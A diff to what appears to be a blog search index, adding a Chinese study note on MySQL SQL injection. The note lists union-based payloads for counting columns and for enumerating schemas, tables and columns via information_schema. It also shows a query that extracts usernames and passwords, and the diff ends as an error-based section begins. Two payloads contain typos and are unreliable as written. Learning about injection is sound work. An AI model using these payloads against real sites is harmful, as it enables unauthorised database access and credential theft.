@@ -8,9 +8,15 @@
       <link href="2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"/>
       <url>2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>SQL注入这方面一直挺菜的，整理一下吧</p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="1-判断column数及回显数据字段位置"><a href="#1-判断column数及回显数据字段位置" class="headerlink" title="1. 判断column数及回显数据字段位置"></a>1. 判断column数及回显数据字段位置</h3><ul><li><code>order/group by N</code></li><li><code>union select 1,2,3...N</code></li></ul><hr><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的select查询条件返回结果为空即可</li><li>注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一</li></ul><hr><h3 id="2-爆"><a href="#2-爆" class="headerlink" title="2. 爆"></a>2. 爆</h3><ul><li><p>MySQL version &lt; 5.0</p><ul><li><p>由于MySQL的低版本缺乏系统库<code>information_schema</code>，故通常情况下，我们无法直接查询表名，字段（列）名等信息</p><p>这时候只能靠猜来解决，直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据</p><p>若知道仅表名而不知道列（字段）名，可以尝试：</p><ul><li><p>单字段：<code>select *,1,2,xxx from table_name</code></p></li><li><p>多字段：<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p></li></ul></li></ul></li><li><p>MySQL version &gt;=5.0</p><ul><li><p>爆schema</p><ul><li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li></ul></li><li><p>爆table</p><ul><li><p><code>union select 1,2,group_concat(table_name) from information_schema. where table_schema=database()</code></p></li><li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p></li></ul></li><li><p>爆column</p><ul><li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li><li><code>union select 1,2,column_name from information_schema.columns where table_schema=database(0) limit 0,1</code></li></ul></li><li><p>出</p><ul><li><code>select heart from Du1</code></li><li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li></ul></li></ul></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
       
     </entry>
     
